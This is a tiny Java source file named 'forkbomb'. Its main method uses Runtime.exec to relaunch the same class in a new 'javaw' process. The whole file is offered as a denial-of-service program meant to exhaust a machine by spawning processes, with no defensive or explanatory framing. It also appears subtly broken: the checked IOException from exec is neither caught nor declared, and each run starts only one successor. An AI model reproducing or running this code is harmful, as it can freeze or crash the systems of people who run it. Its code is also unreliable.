public class forkbomb
{
	public static void main(String[] args)
	{
		Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "forkbomb"});
	}
}
